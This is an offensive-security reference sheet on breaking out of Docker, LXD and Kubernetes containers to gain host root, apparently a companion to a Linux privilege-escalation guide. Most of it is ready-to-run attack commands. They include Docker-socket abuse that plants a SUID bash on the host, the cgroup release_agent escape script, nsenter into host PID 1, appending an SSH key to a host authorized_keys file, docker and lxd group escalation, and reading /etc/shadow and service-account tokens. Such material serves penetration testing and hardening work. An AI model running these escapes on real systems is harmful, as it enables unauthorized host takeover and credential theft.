# Container & Docker Escape

Reference for breaking out of containers to host root and for abusing host-level container group memberships (`docker`, `lxd`/`lxc`). Companion to `linux-privesc-methodology.md`. Container escape is, in effect, the ultimate Linux privesc: container root → host root.

---

## 1. "Am I in a Container?" Detection

```bash
ls -la /.dockerenv 2>/dev/null                 # Docker marker file
cat /proc/1/cgroup                             # 'docker'/'kubepods'/'lxc' in paths
cat /proc/1/sched | head -1                    # PID1 name not 'systemd'/'init'?
grep -i container /proc/1/environ 2>/dev/null
systemd-detect-virt 2>/dev/null                # 'docker', 'lxc', 'podman', ...
env | grep -i kube                             # KUBERNETES_* => k8s pod
mount | grep -E 'overlay|aufs'                 # overlay rootfs typical of containers
```

### Assess your container's power
```bash
id; capsh --print                              # CAP_SYS_ADMIN / CAP_SYS_PTRACE / CAP_DAC_READ_SEARCH?
cat /proc/self/status | grep -i cap
fdisk -l 2>/dev/null; lsblk 2>/dev/null        # host disks visible => --privileged
mount | grep -E 'docker.sock|/host|hostpath'   # mounted host socket/paths
ls -la /var/run/docker.sock 2>/dev/null        # mounted Docker socket => host root
ls -la /run/containerd/containerd.sock 2>/dev/null
mount | grep -i 'rw,' | grep -iE '/host|/root|/etc' # writable host mounts
```

---

## 2. Escape Primitives (from inside a container)

### 2.1 Mounted Docker socket (`/var/run/docker.sock`)
The single most common real-world escape. Talking to the daemon = root on host.
```bash
# Via docker client if present:
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

# Via raw curl if docker binary absent:
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json   # confirm access
# Create a container that mounts host / and writes a SUID/cron to host:
curl -s -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cp /bin/bash /host/tmp/rb; chmod +s /host/tmp/rb"],
       "Binds":["/:/host"]}' http://localhost/containers/create?name=esc
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/esc/start
# back on host: /tmp/rb -p
```

### 2.2 `--privileged` container (or CAP_SYS_ADMIN)
A privileged container can mount the host disk or abuse cgroups.
```bash
# Mount the host root filesystem directly:
fdisk -l                                  # find host disk, e.g. /dev/sda1
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh

# Classic cgroup release_agent escape (privileged, cgroup v1):
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
mkdir -p $d/w; echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o; echo $t/c > $d/release_agent
printf '#!/bin/sh\nps >'"$t/o" > /c; chmod +x /c
sh -c "echo \$\$ > $d/w/cgroup.procs"; sleep 1; cat /o   # runs as host root
```

### 2.3 Capability-based escapes
```bash
# CAP_SYS_ADMIN: mount, or release_agent (above). Often also enables many others.
# CAP_DAC_READ_SEARCH: shocker-style open_by_handle_at to read host files (/etc/shadow).
# CAP_SYS_PTRACE + shared host PID ns: inject into a host process.
# CAP_SYS_MODULE: insmod a malicious kernel module → host root.
capsh --print | grep -oE 'cap_[a-z_]+'
```

### 2.4 Host PID namespace shared (`--pid=host`)
```bash
ps aux                                    # you see HOST processes
# nsenter into PID 1's namespaces if you have CAP_SYS_ADMIN:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### 2.5 Writable host bind mounts
```bash
mount | grep -iE 'rw.*(/|/etc|/root|/home)'
# If /etc or /root is bind-mounted rw → write authorized_keys / cron / passwd on host.
echo 'ssh-ed25519 AAAA... atk' >> /mnt/hostetc/.../authorized_keys
```

### 2.6 Container runtime CVEs (2024-2025)
| CVE | Component | Effect |
|-----|-----------|--------|
| CVE-2024-21626 | runc "Leaky Vessels" | fd leak → host filesystem access / escape |
| CVE-2024-23651/23652/23653 | BuildKit | build-time escape / arbitrary host write |
| CVE-2025-31133 | runc | replace `/dev/null` with symlink to procfs → bypass maskedPaths → escape |
| CVE-2025-23266 / others | runc/containerd (2025) | maskedPaths / mount-handling escapes |
```bash
runc --version; docker version            # match to CVE ranges
containerd --version 2>/dev/null
# Use published PoC for the matching runc/containerd version.
```

---

## 3. Host-Level Group Abuse (not in a container — you're a host user)

### 3.1 `docker` group = instant root
Membership in `docker` is root-equivalent by design.
```bash
id | grep -o docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# or write a SUID shell to host:
docker run -v /:/mnt --rm alpine sh -c 'cp /mnt/bin/bash /mnt/tmp/rb; chmod +s /mnt/tmp/rb'
/tmp/rb -p
```

### 3.2 `lxd` / `lxc` group = root via privileged container
```bash
id | grep -oE 'lxd|lxc'
# Import a small image (alpine), launch privileged, mount host /:
# (build/import a distrobuilder alpine image if none present)
lxc init alpine-img esc -c security.privileged=true
lxc config device add esc host disk source=/ path=/mnt/host recursive=true
lxc start esc
lxc exec esc -- sh -c 'cp /mnt/host/bin/bash /mnt/host/tmp/rb; chmod +s /mnt/host/tmp/rb'
/tmp/rb -p
```

### 3.3 Other powerful host groups
```bash
# 'disk' group → read/write raw disk → read shadow, write files
debugfs /dev/sda1            # then: cat /etc/shadow
# 'adm' → read most logs (creds in logs); 'shadow' → read /etc/shadow
```

---

## 4. Kubernetes Pod Escapes (quick reference)

```bash
# Service-account token + API access:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list 2>/dev/null
# If you can create privileged pods → schedule a pod mounting host / and chroot.
# hostPath volume mounted into pod → write to node filesystem.
mount | grep -i hostpath
```

---

## 5. Cheatsheet

```bash
# DETECT
ls -la /.dockerenv; cat /proc/1/cgroup; capsh --print; systemd-detect-virt

# SOCKET ESCAPE
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

# PRIVILEGED ESCAPE
fdisk -l; mount /dev/sda1 /mnt; chroot /mnt sh

# HOST PID NS
nsenter --target 1 -m -u -i -n -p -- /bin/bash

# HOST GROUPS
docker run -v /:/mnt --rm -it alpine chroot /mnt sh     # docker group
debugfs /dev/sda1                                        # disk group → cat /etc/shadow

# RUNC CVEs (match version)
runc --version    # CVE-2024-21626 / CVE-2025-31133
```

---

## References

- HackTricks – Docker Breakout / Privilege Escalation — https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
- HackTricks – Containerd / runC escape — https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
- GTFOBins (docker, lxc) — https://gtfobins.github.io/
- Leaky Vessels (CVE-2024-21626) – Snyk — https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/
- CVE-2025-31133 runC advisory — https://github.com/opencontainers/runc/security/advisories
- PEASS-ng deepce (container enum) — https://github.com/stealthcopter/deepce
